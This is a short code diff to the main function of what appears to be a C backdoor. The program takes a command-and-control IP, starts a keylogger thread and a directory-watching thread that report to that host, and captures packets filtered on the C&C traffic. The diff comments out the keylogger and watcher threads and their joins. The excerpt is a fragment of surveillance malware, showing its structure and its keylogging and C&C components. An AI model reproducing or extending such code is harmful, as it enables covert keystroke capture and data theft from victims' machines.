@@ -71,7 +71,7 @@ int main(int argc, char **argv){
                 exit(1);
         }
     }
-
+/*
     //keylogger thread
     keylogger_struct *keylogger_args = malloc(sizeof *keylogger_args);  //create struct to pass args to thread
     strncpy(keylogger_args->cnc_ip, cnc_ip, BUFSIZ);
@@ -85,15 +85,15 @@ int main(int argc, char **argv){
     strncpy(inotify_args->localip, local_ip, BUFSIZ);
     inotify_args->tcp = tcp;
     pthread_create(&inotify_thread, NULL, watch_directory,inotify_args);
-
+*/
     //start capturing packets
     Filter = InitFilter(cnc_ip,local_ip, true);
     CreateFilter(Filter, pcapfilter,tcp);
     printf("Filter: %s\n",pcapfilter);
     Packetcapture(pcapfilter,Filter,tcp);
 
-    pthread_join(keylogger_thread, NULL);
-    pthread_join(inotify_thread, NULL);
+ //   pthread_join(keylogger_thread, NULL);
+  //  pthread_join(inotify_thread, NULL);
 
     return 0;
 }
